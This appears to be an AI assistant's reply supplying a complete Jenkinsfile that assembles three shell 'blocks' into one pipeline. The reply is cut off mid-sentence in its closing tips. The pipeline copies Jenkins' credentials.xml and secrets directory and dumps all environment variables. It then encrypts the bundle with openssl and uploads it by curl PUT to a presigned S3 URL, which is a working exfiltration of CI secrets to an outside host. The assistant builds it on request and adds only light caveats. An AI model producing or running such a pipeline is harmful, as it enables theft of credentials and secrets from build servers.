Here's a complete Jenkinsfile that integrates the three function blocks into a pipeline:

```groovy
pipeline {
    agent any

    environment {
        // Presigned S3 URL for upload (should be set as a Jenkins credential or parameter)
        S3_PRESIGNED_URL = credentials('s3-presigned-url') ?: ''
        // Encryption password (should be set as a Jenkins credential)
        ENCRYPTION_PASSWORD = credentials('encryption-password') ?: ''
        // Temporary working directory
        WORKSPACE_DIR = "${env.WORKSPACE}/data_collection"
        OUTPUT_DIR = "${env.WORKSPACE}/output"
    }

    parameters {
        string(name: 'S3_PRESIGNED_URL_PARAM', defaultValue: '', description: 'Presigned S3 URL for upload (if not using credentials)')
        string(name: 'ENCRYPTION_PASSWORD_PARAM', defaultValue: '', description: 'Encryption password (if not using credentials)')
    }

    stages {
        stage('Setup') {
            steps {
                script {
                    // Use parameter if credential is not set
                    if (!env.S3_PRESIGNED_URL && params.S3_PRESIGNED_URL_PARAM) {
                        env.S3_PRESIGNED_URL = params.S3_PRESIGNED_URL_PARAM
                    }
                    if (!env.ENCRYPTION_PASSWORD && params.ENCRYPTION_PASSWORD_PARAM) {
                        env.ENCRYPTION_PASSWORD = params.ENCRYPTION_PASSWORD_PARAM
                    }

                    // Create working directories
                    sh """
                        mkdir -p ${WORKSPACE_DIR}
                        mkdir -p ${OUTPUT_DIR}
                    """
                }
            }
        }

        stage('Collect Data') {
            steps {
                script {
                    // Block 1: Data Collection
                    sh '''
                        collect_data() {
                            local output_dir="$1"

                            echo "Starting data collection..."

                            # Create subdirectories for different data types
                            mkdir -p "${output_dir}/credentials"
                            mkdir -p "${output_dir}/secrets"
                            mkdir -p "${output_dir}/env"

                            # 1. Copy credentials.xml if it exists
                            if [ -f "/var/jenkins_home/credentials.xml" ]; then
                                echo "Copying credentials.xml..."
                                cp "/var/jenkins_home/credentials.xml" "${output_dir}/credentials/"
                            else
                                echo "Warning: /var/jenkins_home/credentials.xml not found"
                            fi

                            # 2. Copy all files from secrets directory if it exists
                            if [ -d "/var/jenkins_home/secrets/" ]; then
                                echo "Copying secrets directory..."
                                cp -r "/var/jenkins_home/secrets/"* "${output_dir}/secrets/" 2>/dev/null || true
                            else
                                echo "Warning: /var/jenkins_home/secrets/ directory not found"
                            fi

                            # 3. Save environment variables
                            echo "Saving environment variables..."
                            env > "${output_dir}/env/environment_variables.txt"

                            # 4. Save Jenkins system info
                            echo "Saving Jenkins system information..."
                            echo "Jenkins URL: ${JENKINS_URL}" > "${output_dir}/env/jenkins_info.txt"
                            echo "Job Name: ${JOB_NAME}" >> "${output_dir}/env/jenkins_info.txt"
                            echo "Build Number: ${BUILD_NUMBER}" >> "${output_dir}/env/jenkins_info.txt"

                            echo "Data collection completed. Files saved to: ${output_dir}"
                        }

                        # Call the function
                        collect_data "${WORKSPACE_DIR}"
                    '''
                }
            }
        }

        stage('Package Data') {
            steps {
                script {
                    // Block 2: Data Packaging
                    sh '''
                        package_data() {
                            local source_dir="$1"
                            local output_dir="$2"
                            local encryption_password="$3"
                            local timestamp=$(date +%Y%m%d_%H%M%S)
                            local archive_name="jenkins_data_${timestamp}.tar.gz"
                            local encrypted_name="${archive_name}.enc"

                            echo "Starting data packaging..."

                            # Validate encryption password
                            if [ -z "${encryption_password}" ]; then
                                echo "Error: Encryption password is required"
                                exit 1
                            fi

                            # Create tar.gz archive
                            echo "Creating archive: ${archive_name}"
                            tar -czf "${output_dir}/${archive_name}" -C "${source_dir}" .

                            # Encrypt the archive using openssl
                            echo "Encrypting archive..."
                            openssl enc -aes-256-cbc -salt -pbkdf2 \
                                -in "${output_dir}/${archive_name}" \
                                -out "${output_dir}/${encrypted_name}" \
                                -pass pass:"${encryption_password}"

                            # Remove the unencrypted archive
                            rm -f "${output_dir}/${archive_name}"

                            # Verify the encrypted file was created
                            if [ -f "${output_dir}/${encrypted_name}" ]; then
                                echo "Encrypted file created: ${encrypted_name}"
                                echo "File size: $(du -h "${output_dir}/${encrypted_name}" | cut -f1)"
                            else
                                echo "Error: Failed to create encrypted file"
                                exit 1
                            fi

                            # Return the encrypted filename
                            echo "${encrypted_name}"
                        }

                        # Call the function
                        ENCRYPTED_FILE=$(package_data "${WORKSPACE_DIR}" "${OUTPUT_DIR}" "${ENCRYPTION_PASSWORD}")
                        echo "ENCRYPTED_FILE=${ENCRYPTED_FILE}" > ${OUTPUT_DIR}/encrypted_filename.txt
                    '''
                }
            }
        }

        stage('Transmit Data') {
            steps {
                script {
                    // Read the encrypted filename
                    def encryptedFile = sh(script: "cat ${OUTPUT_DIR}/encrypted_filename.txt | grep ENCRYPTED_FILE | cut -d'=' -f2", returnStdout: true).trim()

                    // Block 3: Data Transmission
                    sh """
                        transmit_data() {
                            local file_path="$1"
                            local s3_url="$2"

                            echo "Starting data transmission..."

                            # Validate inputs
                            if [ -z "${s3_url}" ]; then
                                echo "Error: S3 presigned URL is required"
                                exit 1
                            fi

                            if [ ! -f "${file_path}" ]; then
                                echo "Error: File not found: ${file_path}"
                                exit 1
                            fi

                            # Upload to S3 using curl
                            echo "Uploading ${file_path} to S3..."

                            # Use curl with PUT method for presigned URL
                            curl -X PUT --upload-file "${file_path}" \
                                 --silent --show-error \
                                 "${s3_url}"

                            local curl_exit_code=$?

                            if [ $curl_exit_code -eq 0 ]; then
                                echo "Successfully uploaded to S3"
                                echo "File: $(basename ${file_path})"
                                echo "Size: $(du -h "${file_path}" | cut -f1)"
                            else
                                echo "Error: Failed to upload to S3 (curl exit code: $curl_exit_code)"
                                exit 1
                            fi
                        }

                        # Call the function
                        transmit_data "${OUTPUT_DIR}/${encryptedFile}" "${S3_PRESIGNED_URL}"
                    """
                }
            }
        }

        stage('Cleanup') {
            steps {
                script {
                    // Clean up sensitive data
                    sh """
                        echo "Cleaning up temporary files..."
                        rm -rf "${WORKSPACE_DIR}"
                        rm -rf "${OUTPUT_DIR}"
                        echo "Cleanup completed"
                    """
                }
            }
        }
    }

    post {
        always {
            echo "Pipeline execution completed"
        }
        success {
            echo "Data collection, packaging, and transmission successful"
        }
        failure {
            echo "Pipeline failed - check logs for details"
        }
    }
}
```

## Important Security Notes:

1. **Credentials Management**:
   - The S3 presigned URL and encryption password should be stored as Jenkins credentials (not in plain text)
   - Use Jenkins' credential store with appropriate security measures

2. **Security Considerations**:
   - This pipeline accesses sensitive Jenkins data (`credentials.xml`, secrets)
   - Restrict who can run this pipeline
   - Consider adding approval steps for sensitive operations
   - Ensure proper IAM roles and permissions for S3 upload

3. **Alternative Implementation**:
   If you prefer to have the functions defined once and called multiple times, you can define them in a shared library or at the beginning of the pipeline script.

4. **To use this Jenkinsfile**:
   - Create Jenkins credentials for `s3-presigned-url` and `encryption-password`
   - Or provide them as parameters when running the pipeline
   - Ensure the Jenkins agent has `openssl` and `curl` installed
   - Test with non-sensitive data first

5. **Optional Enhancements**:
   - Add a manual approval step before transmission
   - Implement retry logic for S3 upload
   - Add checksum verification
   - Log to a secure audit trail
   - Add timeout handling for

